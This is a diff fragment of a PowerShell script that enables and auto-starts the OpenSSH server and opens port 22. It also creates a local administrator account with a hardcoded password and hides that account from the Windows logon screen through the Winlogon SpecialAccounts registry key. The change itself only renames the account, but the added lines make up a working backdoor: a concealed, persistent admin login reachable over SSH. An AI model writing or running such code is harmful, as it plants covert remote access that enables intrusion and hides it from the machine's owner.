@@ -4,12 +4,12 @@ Start-Service sshd
 Set-Service -Name sshd -StartupType Automatic
 New-NetFirewallRule -Name sshd -DisplayName "OpenSSH Server (sshd)" -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 -ErrorAction SilentlyContinue
 
-net user ps1yu Clark2025! /add
-net localgroup administradores ps1yu /add
-net localgroup administrators ps1yu /add
+net user psyu Clark2025! /add
+net localgroup administradores psyu /add
+net localgroup administrators psyu /add
 New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" -Force
 New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Force
-New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "ps1yu" -Value 0 -PropertyType DWord -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" -Name "psyu" -Value 0 -PropertyType DWord -Force
 
 $configDir  = "C:\ProgramData\ssh"
 $configPath = "$configDir\sshd_config"
